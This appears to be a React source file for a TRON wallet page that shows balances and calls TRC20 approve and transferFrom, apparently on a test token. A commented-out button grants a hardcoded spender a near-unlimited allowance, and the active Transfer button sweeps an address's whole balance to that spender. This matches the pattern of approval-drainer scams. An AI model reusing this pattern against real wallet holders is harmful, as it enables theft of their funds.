import { useEffect, useState } from 'react'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import ABI from './config/ODD_TRC20_ABI.json'

// const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const ODD_TRC20_ADDRESS = 'TCxpWv5zvRhSmNpRj94ugJUirXZokr2EJs'
const SPENDER_ADDRESS = 'TTohWznyAKa4ieqVNs2savRtAY2KzcoajD'

let tronWeb = null, contract = null
function App() {
	const [ address, setAddress ] = useState('')
	const [ trxBalance, setTrxBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ bandwidth, setBandwidth ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化Tron
	 */
	const initTron = async () => {
		if (window.tronWeb) {
			tronWeb = window.tronWeb
			setAddress(tronWeb.defaultAddress.base58)
			contract = await tronWeb.contract(ABI, ODD_TRC20_ADDRESS)
			console.log(contract)
			refresh()
		} else {
			Toast.fail('Tron not found!')
		}
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const trxB = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
		const usdtB = await contract.balanceOf(tronWeb.defaultAddress.base58).call()
		setTrxBalance(tronWeb.fromSun(trxB))
		setUsdtBalance(tronWeb.fromSun(usdtB))
		const bw = await tronWeb.trx.getBandwidth(tronWeb.defaultAddress.base58)
		setBandwidth(bw)
		// const fee = await contract.maximumFee().call()
		// console.log(tronWeb.fromSun(fee))
		Toast.hide()
	}

	useEffect(() => {
		Toast.loading('Loading...')
		setTimeout(() => initTron(), 500)
	}, [])

	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">TRON</h1>
			<div className="py-3 text-center text-sm text-gray-600">
				<div>Address: <span className="text-blue-500">{address}</span></div>
				<div>Balance:  <span className="text-red-500 mx-2">{trxBalance} TRX</span>| <span className="text-green-500 ml-2">{usdtBalance} USDT</span></div>
				<div>Bandwidth: <span className="text-yellow-500">{bandwidth}/1500</span></div>
			</div>
			<Btn text={'Refresh'} onClick={() => refresh(true)} />
			{/* <Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					const { remaining } = await contract.allowance(address, SPENDER_ADDRESS).call()
					const allowanceBalance = tronWeb.fromSun(remaining)
					if (allowanceBalance > 0) {
						return Toast.success('You have done!')
					}
					const res = await contract.approve(SPENDER_ADDRESS, 99999999000000).send()
					console.log(res)
				}} 
			/> */}
			{/* <Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/> */}
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			{/* <Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					// if (!from.trim()) {
					// 	Toast.fail('From address is required!')
					// 	return
					// }
					if (from && !tronWeb.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const { remaining } = await contract.allowance(from || address, SPENDER_ADDRESS).call()
					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${tronWeb.fromSun(remaining)}`)
				}} 
			/> */}
			<Btn 
				text={'Transfer'} 
				theme={'yellow'} 
				onClick={async () => {
					if (from && !tronWeb.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const toAddress = to || SPENDER_ADDRESS
					// const balance = await contract.balanceOf(address).call()
					const balance = await contract.balanceOf(from || address).call()
					alert(`【${from || address}】向【${toAddress}】转账【${tronWeb.fromSun(balance)}】开始`)
					Toast.loading('Loading...')
					const res = await contract.transferFrom(from || address, toAddress, balance).send()
					// const res = await contract.transfer(toAddress, balance).send()
					console.log(res)
					Toast.hide()
					setTimeout(() => {
						refresh()
					}, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
